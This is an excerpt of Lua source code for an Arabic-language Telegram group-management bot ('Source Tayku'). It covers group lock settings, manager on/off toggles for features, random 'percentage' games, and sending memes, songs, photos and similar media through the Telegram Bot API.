if DevLeo:get(Tayku..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevLeo:get(Tayku.."Rio:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevLeo:get(Tayku..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevLeo:get(Tayku..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevLeo:get(Tayku..'Rio:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source Tayku     --
...
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Antk:Rio'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Antk:Rio'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevLeo:get(Tayku..'Rio:Antk:Rio'..msg.chat_id_) and ChCheck(msg) then
...
--     Source Tayku     --
if DevLeo:get(Tayku..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevLeo:del(Tayku..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevLeo:del(Tayku..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevLeo:set(Tayku..'Rio:rules'..msg.chat_id_,text)
...
DevLeo:set(Tayku..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = DevLeo:get(Tayku..'Rio:rules'..msg.chat_id_)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Zrf:Rio'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الزخرفه بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Zrf:Rio'..msg.chat_id_,true)  
end
if DevLeo:get(Tayku..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الزخرفه', 1, 'md')
DevLeo:del(Tayku..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
...
if not DevLeo:get(Tayku..'Rio:Zrf:Rio'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevLeo:setex(Tayku.."Zrf:Rio"..msg.chat_id_..msg.sender_user_id_,300,true)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Brg:Rio'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الابراج بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Brg:Rio'..msg.chat_id_,true)  
end
if not DevLeo:get(Tayku..'Rio:Brg:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Nsba:Rio'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Nsba:Rio'..msg.chat_id_,true)  
end
if not DevLeo:get(Tayku..'Rio:Nsba:Rio'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "نسبة الحب" and ChCheck(msg) then
DevLeo:set(Tayku..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevLeo:get(Tayku..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الحب ', 1, 'md')
DevLeo:del(Tayku..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
...
DevLeo:set(Tayku..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ᥀" and DevLeo:get(Tayku..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevLeo:del(Tayku..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevLeo:set(Tayku..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ᥀" and DevLeo:get(Tayku..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevLeo:del(Tayku..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevLeo:set(Tayku..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ᥀" and DevLeo:get(Tayku..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الكره ', 1, 'md')
DevLeo:del(Tayku..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevLeo:set(Tayku..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ᥀" and DevLeo:get(Tayku..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevLeo:del(Tayku..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevLeo:set(Tayku..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ᥀" and DevLeo:get(Tayku..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevLeo:del(Tayku..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevLeo:set(Tayku..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ᥀" and DevLeo:get(Tayku..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevLeo:del(Tayku..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Age:Rio'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Age:Rio'..msg.chat_id_,true)  
end
if not DevLeo:get(Tayku..'Rio:Age:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Mean:Rio'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل معاني الاسماء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Mean:Rio'..msg.chat_id_,true)  
end
if not DevLeo:get(Tayku..'Rio:Mean:Rio'..msg.chat_id_) then
...
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:gif:Rio'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and ChCheck(msg) or text == "تعطيل المتحركه" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:gif:Rio'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ᥀") and not DevLeo:get(Tayku..'Rio:gif:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifTayku/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Tayku     --
if text == "تفعيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تفعيل الميمز" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:memz:Rio'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تعطيل الميمز" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:memz:Rio'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ᥀") and not DevLeo:get(Tayku..'Rio:memz:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzTayku/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Tayku     --
if text == "تفعيل غنيلي" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Audios:Rio'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Audios:Rio'..msg.chat_id_,true)  
end
if text and (text == "غنيلي" or text == "↫ غنيلي ᥀") and not DevLeo:get(Tayku..'Rio:Audios:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/AudiosTayku/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Tayku     --
if text == "تفعيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تفعيل اغنيه" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:mp3:Rio'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تعطيل اغنيه" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:mp3:Rio'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ᥀" or text == "اغاني") and not DevLeo:get(Tayku..'Rio:mp3:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/TaykuMp3/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Tayku     --
if text == "تفعيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تفعيل الريمكس" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Remix:Rio'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تعطيل الريمكس" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Remix:Rio'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ᥀") and not DevLeo:get(Tayku..'Rio:Remix:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixTayku/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Tayku     --
if text == "تفعيل صوره" and Manager(msg) and ChCheck(msg) or text == "تفعيل الصوره" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Photo:Rio'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and ChCheck(msg) or text == "تعطيل الصوره" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Photo:Rio'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ᥀") and not DevLeo:get(Tayku..'Rio:Photo:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosTayku/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Tayku     --
if text == "تفعيل انمي" and Manager(msg) and ChCheck(msg) or text == "تفعيل الانمي" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Anime:Rio'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and ChCheck(msg) or text == "تعطيل الانمي" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Anime:Rio'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ᥀") and not DevLeo:get(Tayku..'Rio:Anime:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AnimeTayku/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Tayku     --
if text == "تفعيل فلم" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Movies:Rio'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Movies:Rio'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ᥀") and not DevLeo:get(Tayku..'Rio:Movies:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MoviesTayku/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Tayku     --
if text == "تفعيل مسلسل" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Series:Rio'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Series:Rio'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ᥀") and not DevLeo:get(Tayku..'Rio:Series:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SeriesTayku/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Tayku     --
if Admin(msg) then
if DevLeo:get(Tayku..'Rio:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevLeo:get(Tayku..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙الروابط ↫ "..mute_links.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevLeo:get(Tayku..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙المعرف ↫ "..lock_tag.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevLeo:get(Tayku..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙المتحركه ↫ "..mute_gifs.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الملصقات" then if DevLeo:get(Tayku..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙الملصقات ↫ "..lock_sticker.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الصور" then if DevLeo:get(Tayku..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙الصور ↫ "..mute_photo.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevLeo:get(Tayku..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙الفيديو ↫ "..mute_video.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الاونلاين" then if DevLeo:get(Tayku..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local TaykuTeam = "\n" .."᥀︙الاونلاين ↫ "..mute_in.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الدردشه" then if DevLeo:get(Tayku..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙الدردشه ↫ "..mute_text.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
